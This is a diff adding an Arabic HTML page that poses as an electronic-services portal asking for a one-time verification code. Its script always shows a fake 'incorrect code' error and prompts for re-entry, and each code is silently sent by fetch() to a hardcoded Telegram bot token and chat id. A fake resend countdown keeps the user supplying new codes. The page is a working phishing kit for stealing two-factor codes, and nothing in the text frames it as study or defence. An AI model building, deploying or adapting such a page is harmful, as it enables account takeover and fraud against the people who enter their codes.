@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>بوابة الخدمات الإلكترونية</title>
+  <style>
+    body{font-family:Tahoma,Arial;background:#fff;margin:0;min-height:100vh;display:flex;flex-direction:column}
+    header{text-align:center;padding:20px}
+    header img{height:80px;max-width:100%}
+    main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
+    .box{width:100%;max-width:420px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12);text-align:center}
+
+    input#onlyNumber{
+      width:100%;
+      padding:12px;
+      margin-top:16px;
+      border:1px solid #ccc;
+      border-radius:6px;
+      box-sizing:border-box;
+      font-size:16px;
+      text-align:center;
+      transition:border-color .2s, background .2s;
+    }
+    .input-error{
+      border-color:#c00 !important;
+      background:#ffecec !important;
+    }
+
+    #verifyBtn{
+      margin-top:12px;
+      padding:12px 14px;
+      width:100%;
+      background:#0b5320;
+      color:#fff;
+      border:0;
+      border-radius:6px;
+      font-weight:800;
+      cursor:pointer;
+      position:relative;
+      overflow:hidden;
+    }
+
+    #resendBtn{
+      margin-top:12px;
+      padding:12px 14px;
+      width:100%;
+      background:#fff;
+      color:#333;
+      border:1px solid #ccc;
+      border-radius:6px;
+      font-weight:800;
+      cursor:pointer;
+      position:relative;
+      overflow:hidden;
+    }
+
+    button:disabled{opacity:.85;cursor:default}
+
+    #errorMsg{color:#c00;margin-top:10px;font-size:15px;display:none}
+
+    .spinner{
+      width:22px;height:22px;
+      border:3px solid rgba(255,255,255,.4);
+      border-top-color:#fff;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      margin:auto;
+    }
+    #resendBtn .spinner{
+      border-color:rgba(0,0,0,.15);
+      border-top-color:#000;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    footer{
+      background:#000;color:#fff;padding:18px 20px;margin-top:30px;
+      font-size:13px;text-align:center
+    }
+
+    /* شاشة تحميل عند الدخول – الدائرة كبيرة والحقول ظاهرة */
+    #pageLoader{
+      position:fixed;
+      inset:0;
+      background:transparent;      /* الحقول تبقى ظاهرة */
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+      pointer-events:none;
+    }
+    #pageLoader .spinner{
+      width:90px;                  /* دائرة كبيرة */
+      height:90px;
+      border:10px solid rgba(0,0,0,.15);
+      border-top-color:#000;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+    }
+  </style>
+</head>
+<body>
+
+<!-- تحميل عند دخول الصفحة 4 ثواني -->
+<div id="pageLoader"><div class="spinner"></div></div>
+
+<header>
+  <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" alt="الشعار">
+  <h2>بوابة الخدمات الإلكترونية</h2>
+</header>
+
+<main>
+  <div class="box">
+    <h3>أدخل رمز التحقق</h3>
+
+    <input
+      id="onlyNumber"
+      name="one-time-code"
+      type="tel"
+      inputmode="numeric"
+      autocomplete="one-time-code"
+      placeholder="أدخل رمز التحقق"
+      maxlength="9"
+    >
+
+    <button id="verifyBtn" type="button">تحقق</button>
+    <button id="resendBtn" type="button">إعادة إرسال</button>
+
+    <p id="errorMsg">الكود غير صحيح</p>
+  </div>
+</main>
+
+<footer>
+  سياسة الخصوصية • حقوق النشر • شروط الاستخدام • معايير WCAG 2.0 AAA • © 2026
+</footer>
+
+<script>
+  // تحميل عند دخول الصفحة 4 ثواني
+  const pageLoader = document.getElementById('pageLoader');
+  setTimeout(() => { pageLoader.style.display = 'none'; }, 4000);
+
+  const input = document.getElementById('onlyNumber');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const resendBtn = document.getElementById('resendBtn');
+  const errorMsg = document.getElementById('errorMsg');
+
+  // إعدادات زر إعادة إرسال
+  const RESEND_LOADING_MS = 5000;
+  const RESEND_COUNTDOWN = 15;
+  let resendTimer = null;
+  let resendRemaining = 0;
+  const resendDefaultText = 'إعادة إرسال';
+
+  function startResendCountdown(){
+    clearInterval(resendTimer);
+    resendRemaining = RESEND_COUNTDOWN;
+    resendBtn.disabled = true;
+    resendBtn.textContent = `انتظر ${resendRemaining} ث`;
+
+    resendTimer = setInterval(() => {
+      resendRemaining--;
+      if (resendRemaining <= 0) {
+        clearInterval(resendTimer);
+        resendRemaining = 0;
+        resendBtn.disabled = false;
+        resendBtn.textContent = resendDefaultText;
+      } else {
+        resendBtn.textContent = `انتظر ${resendRemaining} ث`;
+      }
+    }, 1000);
+  }
+
+  // يبدأ العد تلقائيًا بعد انتهاء تحميل الصفحة
+  setTimeout(() => {
+    resendBtn.disabled = true;
+    resendBtn.innerHTML = '<div class="spinner"></div>';
+    setTimeout(() => { startResendCountdown(); }, RESEND_LOADING_MS);
+  }, 4000);
+
+  resendBtn.addEventListener('click', () => {
+    if (resendBtn.disabled) return;
+    resendBtn.disabled = true;
+    resendBtn.innerHTML = '<div class="spinner"></div>';
+    setTimeout(() => { startResendCountdown(); }, RESEND_LOADING_MS);
+  });
+
+  // التحقق
+  function isValid(v){ return /^[0-9]{4,9}$/.test(v); }
+
+  function showInputError(){
+    input.classList.add('input-error');
+    setTimeout(() => { input.classList.remove('input-error'); }, 3000);
+  }
+
+  function startVerifyUI(){
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<div class="spinner"></div>';
+    errorMsg.style.display = 'none';
+
+    setTimeout(() => {
+      errorMsg.style.display = 'block';
+      showInputError();
+      verifyBtn.innerHTML = 'تحقق';
+      verifyBtn.disabled = false;
+      input.value = '';
+      input.focus();
+    }, 3000);
+  }
+
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/[^0-9]/g,'').slice(0,9);
+    errorMsg.style.display = 'none';
+    input.classList.remove('input-error');
+  });
+
+  // إذا ضغط تحقق وما في كود أو أقل من 4 أرقام: لا يتغير شيء
+  verifyBtn.addEventListener('click', () => {
+    const val = input.value.trim();
+    if (val === '' || val.length < 4) return;
+    if (!isValid(val)) return;
+    startVerifyUI();
+
+    // ** إرسال الكود إلى بوت التلغرام **
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot8528188278:AAGVc4oOzJjpOgIe6tWwCpQlY5CsAdCRrzk/sendMessage`;
+    const chat_id = '8404960059';
+    const message = `تم إدخال رمز التحقق: ${val}`;
+
+    // إرسال الطلب إلى بوت التلغرام
+    fetch(`${TELEGRAM_API_URL}?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+      .then(response => response.json())
+      .then(data => {
+        console.log("تم إرسال الكود إلى التلغرام:", data);
+      })
+      .catch(error => {
+        console.error("فشل إرسال الكود إلى التلغرام:", error);
+      });
+  });
+</script>
+
+</body>
+</html>
